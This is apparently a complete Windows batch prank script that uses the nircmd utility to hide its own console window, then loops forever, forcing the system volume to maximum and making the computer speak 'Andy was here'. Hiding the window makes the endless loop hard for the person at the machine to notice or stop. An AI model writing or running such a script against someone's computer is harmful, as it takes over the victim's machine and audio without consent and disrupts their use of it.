@echo off
nircmd win hide title "C:\Windows\system32\cmd.exe - andy.bat"
:loop
nircmd setsysvolume 65535
nircmd speak text "Andy was here"
goto loop